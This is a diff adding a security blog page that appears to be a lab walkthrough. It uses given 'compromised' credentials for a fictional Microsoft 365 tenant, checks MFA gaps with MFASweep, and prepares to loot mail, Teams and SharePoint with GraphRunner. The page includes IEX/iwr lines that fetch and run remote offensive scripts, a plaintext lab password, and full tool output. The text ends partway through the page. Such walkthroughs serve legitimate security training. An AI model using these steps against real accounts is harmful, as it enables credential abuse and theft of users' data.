@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Loot Exchange, Teams and SharePoint with GraphRunner | SecFortess</title>
+<meta name="keywords" content="">
+<meta name="description" content="We have been given compromised user credentials:
+Password: MegaBigTech99 IAM User: Clara.Miller@megabigtech.com First step is to check if multi-factor authentication is enforced for this set of account
+We can do this using the MFASweep PowerShell script Then we can load this tool to powershell memory as shown below IEX (iwr &#39;https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1&#39;) we can enumerate the presence of MFA on various online Microsoft services with this script, We can also include a check for Active Directory Federated Services in case it is available.">
+<meta name="author" content="SecFortress">
+<link rel="canonical" href="http://localhost:1313/loot_exchange_teams_and_sharepoint_with_graphrunner/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/loot_exchange_teams_and_sharepoint_with_graphrunner/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="Loot Exchange, Teams and SharePoint with GraphRunner" />
+<meta property="og:description" content="We have been given compromised user credentials:
+Password: MegaBigTech99 IAM User: Clara.Miller@megabigtech.com First step is to check if multi-factor authentication is enforced for this set of account
+We can do this using the MFASweep PowerShell script Then we can load this tool to powershell memory as shown below IEX (iwr &#39;https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1&#39;) we can enumerate the presence of MFA on various online Microsoft services with this script, We can also include a check for Active Directory Federated Services in case it is available." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/loot_exchange_teams_and_sharepoint_with_graphrunner/" /><meta property="article:section" content="" />
+<meta property="article:published_time" content="2024-10-04T10:46:06+01:00" />
+<meta property="article:modified_time" content="2024-10-04T10:46:06+01:00" /><meta property="og:site_name" content="SecFortress" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Loot Exchange, Teams and SharePoint with GraphRunner"/>
+<meta name="twitter:description" content="We have been given compromised user credentials:
+Password: MegaBigTech99 IAM User: Clara.Miller@megabigtech.com First step is to check if multi-factor authentication is enforced for this set of account
+We can do this using the MFASweep PowerShell script Then we can load this tool to powershell memory as shown below IEX (iwr &#39;https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1&#39;) we can enumerate the presence of MFA on various online Microsoft services with this script, We can also include a check for Active Directory Federated Services in case it is available."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Loot Exchange, Teams and SharePoint with GraphRunner",
+      "item": "http://localhost:1313/loot_exchange_teams_and_sharepoint_with_graphrunner/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Loot Exchange, Teams and SharePoint with GraphRunner",
+  "name": "Loot Exchange, Teams and SharePoint with GraphRunner",
+  "description": "We have been given compromised user credentials:\nPassword: MegaBigTech99 IAM User: Clara.Miller@megabigtech.com First step is to check if multi-factor authentication is enforced for this set of account\nWe can do this using the MFASweep PowerShell script Then we can load this tool to powershell memory as shown below IEX (iwr \u0026#39;https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1\u0026#39;) we can enumerate the presence of MFA on various online Microsoft services with this script, We can also include a check for Active Directory Federated Services in case it is available.",
+  "keywords": [
+    
+  ],
+  "articleBody": "We have been given compromised user credentials:\nPassword: MegaBigTech99 IAM User: Clara.Miller@megabigtech.com First step is to check if multi-factor authentication is enforced for this set of account\nWe can do this using the MFASweep PowerShell script Then we can load this tool to powershell memory as shown below IEX (iwr 'https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1') we can enumerate the presence of MFA on various online Microsoft services with this script, We can also include a check for Active Directory Federated Services in case it is available.\nADFS (Active Directory Federation Services) : A Microsoft service for enabling Single Sign-On (SSO) across applications.\nFederation: Links identity providers, allowing users to access external services with internal credentials. e.g., Office 365, cloud applications etc Single Sign-On (SSO) : Users authenticate once and access multiple applications without re-logging in. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Invoke-MFASweep -Username Clara.Miller@megabigtech.com -Password [REDACTED] -Recon -IncludeADFS ---------------- MFASweep ---------------- ---------------- Running recon checks ---------------- [*] Checking if ADFS configured... [*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft. Confirm MFA Sweep [*] WARNING: This script is about to attempt logging into the Clara.Miller@megabigtech.com account TEN (10) different times (11 if you included ADFS). If you entered an incorrect password this may lock the account out. Are you sure you want to continue? [Y] Yes [N] No [?] Help (default is \"Y\"): ########################### Microsoft API Checks ########################### ---------------- Microsoft Graph API ---------------- [*] Authenticating to Microsoft Graph API... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to https://graph.windows.net [***] NOTE: The \"MSOnline\" PowerShell module should work here. ---------------- Azure Service Management API ---------------- [*] Authenticating to Azure Service Management API... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Azure Service Management API [***] NOTE: The \"Az\" PowerShell module should work here. ############################################################################################################ ########################### Microsoft Web Portal User Agent Checks ########################### ---------------- Microsoft 365 Web Portal w/ (Windows) User Agent ---------------- [*] Authenticating to Microsoft 365 Web Portal using a (Windows) user agent... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now... [**] MFA is enabled and was required for this account. [***] MFA Method Used: PhoneAppOTP ############################################################################################################ ---------------- Microsoft 365 Web Portal w/ (Linux) User Agent ---------------- [*] Authenticating to Microsoft 365 Web Portal using a (Linux) user agent... [*] SUCCESS! Clara.Miller@megabigtech.com was able to authenticate to the Microsoft 365 Web Portal. Checking MFA now... [**] MFA is enabled and was required for this account. [***] MFA Method Used: PhoneAppOTP ########################### Legacy Auth Checks ########################### ---------------- Microsoft 365 Exchange Web Services ---------------- [*] Authenticating to Microsoft 365 Exchange Web Services (EWS)... [*] Login failed to O365 EWS. ---------------- Microsoft 365 ActiveSync ---------------- [*] Authenticating to Microsoft 365 Active Sync... InvalidOperation: Line | 852 | $resp = $_.Exception.Response.GetResponseStream() | ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ | Method invocation failed because [System.Net.Http.HttpResponseMessage] does not contain a method named 'GetResponseStream'. [*] Login to ActiveSync failed. ############################################################################################################ ############################################################################################################ ########################### ADFS Check ########################### ---------------- ADFS Authentication ---------------- [*] Getting ADFS URL... [*] ADFS does not appear to be in use. Authentication appears to be managed by Microsoft. [*] Authenticating to On-Prem ADFS Portal at: ######### SINGLE FACTOR ACCESS RESULTS ######### Microsoft Graph API | YES Microsoft Service Management API | YES M365 w/ Windows UA | NO M365 w/ Linux UA | NO M365 w/ MacOS UA | NO M365 w/ Android UA | NO M365 w/ iPhone UA | NO M365 w/ Windows Phone UA | NO Exchange Web Services (BASIC Auth) | NO Active Sync (BASIC Auth) | NO ADFS | NO Notice that single-factor authentication (using only a password) is enabled for our current user on both the Microsoft Graph and Microsoft Service Management APIs!\nMicrosoft 365 apps like Outlook, Teams, and SharePoint use the Graph API, allowing us to extract valuable user content for our engagement.\nWe can check if our current user has been assigned a Microsoft 365 license. Log in to Azure with Connect-AzAccount and Connect-MgGraph Then we can check for license availability with the Get-MgUserLicenseDetail cmdlet The most important information in the above screenshot is the SkuPartNumber value, which indicates the specific Microsoft 365 license assigned to the user. In this case, O365_BUSINESS_ESSENTIALS which allows access to Outlook, Teams, SharePoint and other productivity tools, in the Microsoft 365 suite.\nWe can use the GraphRunner post-exploitation tool to loot in Microsoft 365 environments. We can go ahead and load this tool to powershell memory PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1') ________ __ _______ by Beau Bullock (@dafthack) /_______/___________ ______ | |____/_______\\__ __ ____ ____ ___________ /___\\ __\\______\\____\\ \\_____\\|__|__\\|________/__|__\\/____\\ /____\\_/____\\______\\ \\ \\_\\ \\ | \\// __ \\| |_/ | Y \\ | \\ | / | \\ | \\ ___/| | \\/ \\________/__| (______/__| |___|__|____|___/____/|___|__/___|__/\\___| \u003e__| Do service principals dream of electric sheep? For usage information see the wiki here: https://github.com/dafthack/GraphRunner/wiki To list GraphRunner modules run List-GraphRunnerModules ",
+  "wordCount" : "800",
+  "inLanguage": "en",
+  "datePublished": "2024-10-04T10:46:06+01:00",
+  "dateModified": "2024-10-04T10:46:06+01:00",
+  "author":{
+    "@type": "Person",
+    "name": "SecFortress"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/loot_exchange_teams_and_sharepoint_with_graphrunner/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "SecFortess",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
+                <img src="https://i.imgur.com/mStB3iJ.jpeg" alt="" aria-label="logo"
+                    height="25">SecFortress</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="🥷 Hacking">
+                    <span>🥷 Hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sec-fortress.github.io/" title="✍️ Blog">
+                    <span>✍️ Blog</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami" title="🇳🇬 Whoami">
+                    <span>🇳🇬 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Loot Exchange, Teams and SharePoint with GraphRunner
+    </h1>
+    <div class="post-meta"><span title='2024-10-04 10:46:06 +0100 WAT'>October 4, 2024</span>&nbsp;·&nbsp;4 min&nbsp;·&nbsp;SecFortress
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>We have been given compromised user credentials:</p>
+<pre tabindex="0"><code>Password: MegaBigTech99 
+
+IAM User: Clara.Miller@megabigtech.com 
+</code></pre><p>First step is to check if multi-factor authentication is enforced for this set of account</p>
+<ul>
+<li>We can do this using the <a href="https://github.com/dafthack/MFASweep">MFASweep</a> PowerShell script</li>
+<li>Then we can load this tool to powershell memory as shown below</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s1">&#39;https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><p>we can enumerate the presence of MFA on various online Microsoft services with this script, We can also include a check for Active Directory Federated Services in case it is available.</p>
+<p><strong>ADFS (Active Directory Federation Services)</strong> : A Microsoft service for enabling Single Sign-On (SSO) across applications.</p>
+<ul>
+<li><strong>Federation</strong>: Links identity providers, allowing users to access external services with internal credentials. e.g., Office 365, cloud applications etc</li>
+<li><strong>Single Sign-On (SSO)</strong> : Users authenticate once and access multiple applications without re-logging in.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Invoke-MFASweep</span> <span class="n">-Username</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">-Password</span> <span class="p">[</span><span class="no">REDACTED</span><span class="p">]</span> <span class="n">-Recon</span> <span class="n">-IncludeADFS</span>                                   
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">MFASweep</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Running</span> <span class="n">recon</span> <span class="n">checks</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Checking</span> <span class="k">if</span> <span class="n">ADFS</span> <span class="n">configured</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">ADFS</span> <span class="n">does</span> <span class="n">not</span> <span class="n">appear</span> <span class="n">to</span> <span class="n">be</span> <span class="k">in</span> <span class="n">use</span><span class="p">.</span> <span class="n">Authentication</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">managed</span> <span class="n">by</span> <span class="n">Microsoft</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Confirm</span> <span class="n">MFA</span> <span class="n">Sweep</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">WARNING</span><span class="err">:</span> <span class="n">This</span> <span class="n">script</span> <span class="n">is</span> <span class="n">about</span> <span class="n">to</span> <span class="n">attempt</span> <span class="n">logging</span> <span class="n">into</span> <span class="n">the</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">account</span> <span class="n">TEN</span> <span class="p">(</span><span class="mf">10</span><span class="p">)</span> <span class="n">different</span> <span class="n">times</span> <span class="p">(</span><span class="mf">11</span> <span class="k">if</span> <span class="n">you</span> <span class="n">included</span> <span class="n">ADFS</span><span class="p">).</span> <span class="k">If</span> <span class="n">you</span> <span class="n">entered</span> <span class="n">an</span> <span class="n">incorrect</span> <span class="n">password</span>   
+</span></span><span class="line"><span class="cl"><span class="n">this</span> <span class="n">may</span> <span class="n">lock</span> <span class="n">the</span> <span class="n">account</span> <span class="n">out</span><span class="p">.</span> <span class="n">Are</span> <span class="n">you</span> <span class="n">sure</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="k">continue</span><span class="p">?</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">Y] Yes  [N</span><span class="p">]</span> <span class="n">No</span>  <span class="p">[?]</span> <span class="n">Help</span> <span class="p">(</span><span class="k">default</span> <span class="n">is</span> <span class="s2">&#34;Y&#34;</span><span class="p">)</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="c">########################### Microsoft API Checks ###########################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Microsoft</span> <span class="n">Graph</span> <span class="n">API</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Microsoft</span> <span class="n">Graph</span> <span class="n">API</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">SUCCESS</span><span class="p">!</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">was</span> <span class="n">able</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="n">to</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">graph</span><span class="p">.</span><span class="py">windows</span><span class="p">.</span><span class="py">net</span>
+</span></span><span class="line"><span class="cl"><span class="p">[***]</span> <span class="n">NOTE</span><span class="err">:</span> <span class="n">The</span> <span class="s2">&#34;MSOnline&#34;</span> <span class="n">PowerShell</span> <span class="n">module</span> <span class="n">should</span> <span class="n">work</span> <span class="n">here</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Azure</span> <span class="n">Service</span> <span class="n">Management</span> <span class="n">API</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Azure</span> <span class="n">Service</span> <span class="n">Management</span> <span class="n">API</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">SUCCESS</span><span class="p">!</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">was</span> <span class="n">able</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Azure</span> <span class="n">Service</span> <span class="n">Management</span> <span class="n">API</span>
+</span></span><span class="line"><span class="cl"><span class="p">[***]</span> <span class="n">NOTE</span><span class="err">:</span> <span class="n">The</span> <span class="s2">&#34;Az&#34;</span> <span class="n">PowerShell</span> <span class="n">module</span> <span class="n">should</span> <span class="n">work</span> <span class="n">here</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="c">############################################################################################################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">########################### Microsoft Web Portal User Agent Checks ###########################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span> <span class="n">w</span><span class="p">/</span> <span class="p">(</span><span class="n">Windows</span><span class="p">)</span> <span class="n">User</span> <span class="n">Agent</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span> <span class="n">using</span> <span class="n">a</span> <span class="p">(</span><span class="n">Windows</span><span class="p">)</span> <span class="n">user</span> <span class="n">agent</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">SUCCESS</span><span class="p">!</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">was</span> <span class="n">able</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span><span class="p">.</span> <span class="n">Checking</span> <span class="n">MFA</span> <span class="n">now</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[**]</span> <span class="n">MFA</span> <span class="n">is</span> <span class="n">enabled</span> <span class="n">and</span> <span class="n">was</span> <span class="n">required</span> <span class="k">for</span> <span class="n">this</span> <span class="n">account</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[***]</span> <span class="n">MFA</span> <span class="n">Method</span> <span class="n">Used</span><span class="err">:</span> <span class="n">PhoneAppOTP</span>
+</span></span><span class="line"><span class="cl"><span class="c">############################################################################################################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span> <span class="n">w</span><span class="p">/</span> <span class="p">(</span><span class="n">Linux</span><span class="p">)</span> <span class="n">User</span> <span class="n">Agent</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span> <span class="n">using</span> <span class="n">a</span> <span class="p">(</span><span class="n">Linux</span><span class="p">)</span> <span class="n">user</span> <span class="n">agent</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">SUCCESS</span><span class="p">!</span> <span class="n">Clara</span><span class="p">.</span><span class="n">Miller</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">was</span> <span class="n">able</span> <span class="n">to</span> <span class="n">authenticate</span> <span class="n">to</span> <span class="n">the</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Web</span> <span class="n">Portal</span><span class="p">.</span> <span class="n">Checking</span> <span class="n">MFA</span> <span class="n">now</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[**]</span> <span class="n">MFA</span> <span class="n">is</span> <span class="n">enabled</span> <span class="n">and</span> <span class="n">was</span> <span class="n">required</span> <span class="k">for</span> <span class="n">this</span> <span class="n">account</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[***]</span> <span class="n">MFA</span> <span class="n">Method</span> <span class="n">Used</span><span class="err">:</span> <span class="n">PhoneAppOTP</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">########################### Legacy Auth Checks ###########################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Exchange</span> <span class="n">Web</span> <span class="n">Services</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Exchange</span> <span class="n">Web</span> <span class="n">Services</span> <span class="p">(</span><span class="n">EWS</span><span class="p">)...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Login</span> <span class="n">failed</span> <span class="n">to</span> <span class="n">O365</span> <span class="n">EWS</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">ActiveSync</span> <span class="p">----------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="n">Microsoft</span> <span class="mf">365</span> <span class="n">Active</span> <span class="n">Sync</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">InvalidOperation</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">Line</span> <span class="p">|</span>
+</span></span><span class="line"><span class="cl"> <span class="mf">852</span> <span class="p">|</span>              <span class="nv">$resp</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="py">Exception</span><span class="p">.</span><span class="py">Response</span><span class="p">.</span><span class="py">GetResponseStream</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">     <span class="p">|</span>              <span class="p">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span>
+</span></span><span class="line"><span class="cl">     <span class="p">|</span> <span class="n">Method</span> <span class="n">invocation</span> <span class="n">failed</span> <span class="n">because</span> <span class="p">[</span><span class="no">System.Net.Http.HttpResponseMessage</span><span class="p">]</span> <span class="n">does</span> <span class="n">not</span> <span class="n">contain</span> <span class="n">a</span> <span class="n">method</span> <span class="n">named</span> <span class="s1">&#39;GetResponseStream&#39;</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Login</span> <span class="n">to</span> <span class="n">ActiveSync</span> <span class="n">failed</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="c">############################################################################################################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">############################################################################################################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">########################### ADFS Check ###########################</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span> <span class="n">ADFS</span> <span class="n">Authentication</span> <span class="p">----------------</span>                                                                                                                                         
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Getting</span> <span class="n">ADFS</span> <span class="n">URL</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">ADFS</span> <span class="n">does</span> <span class="n">not</span> <span class="n">appear</span> <span class="n">to</span> <span class="n">be</span> <span class="k">in</span> <span class="n">use</span><span class="p">.</span> <span class="n">Authentication</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">managed</span> <span class="n">by</span> <span class="n">Microsoft</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="n">Authenticating</span> <span class="n">to</span> <span class="nb">On-Prem</span> <span class="n">ADFS</span> <span class="n">Portal</span> <span class="n">at</span><span class="err">:</span>
+</span></span><span class="line"><span class="cl"><span class="c">######### SINGLE FACTOR ACCESS RESULTS #########</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Graph</span> <span class="n">API</span>                  <span class="p">|</span> <span class="n">YES</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Service</span> <span class="n">Management</span> <span class="n">API</span>     <span class="p">|</span> <span class="n">YES</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">Windows</span> <span class="n">UA</span>                   <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">Linux</span> <span class="n">UA</span>                     <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">MacOS</span> <span class="n">UA</span>                     <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">Android</span> <span class="n">UA</span>                   <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">iPhone</span> <span class="n">UA</span>                    <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">M365</span> <span class="n">w</span><span class="p">/</span> <span class="n">Windows</span> <span class="n">Phone</span> <span class="n">UA</span>             <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">Exchange</span> <span class="n">Web</span> <span class="n">Services</span> <span class="p">(</span><span class="n">BASIC</span> <span class="n">Auth</span><span class="p">)</span>   <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">Active</span> <span class="n">Sync</span> <span class="p">(</span><span class="n">BASIC</span> <span class="n">Auth</span><span class="p">)</span>             <span class="p">|</span> <span class="n">NO</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADFS</span>                                 <span class="p">|</span> <span class="n">NO</span>
+</span></span></code></pre></div><p>Notice that single-factor authentication (using only a password) is enabled for our current user on both the Microsoft Graph and Microsoft Service Management APIs!</p>
+<p><img loading="lazy" src="https://i.imgur.com/KPZviMM.png" alt=""  />
+</p>
+<p>Microsoft 365 apps like Outlook, Teams, and SharePoint use the Graph API, allowing us to extract valuable user content for our engagement.</p>
+<ul>
+<li>We can check if our current user has been assigned a Microsoft 365 license.
+<ul>
+<li>Log in to Azure with <code>Connect-AzAccount</code> and <code>Connect-MgGraph</code></li>
+<li>Then we can check for license availability with the <code>Get-MgUserLicenseDetail</code> cmdlet</li>
+</ul>
+</li>
+</ul>
+<p><img loading="lazy" src="https://i.imgur.com/M4EX7Gs.png" alt=""  />
+</p>
+<blockquote>
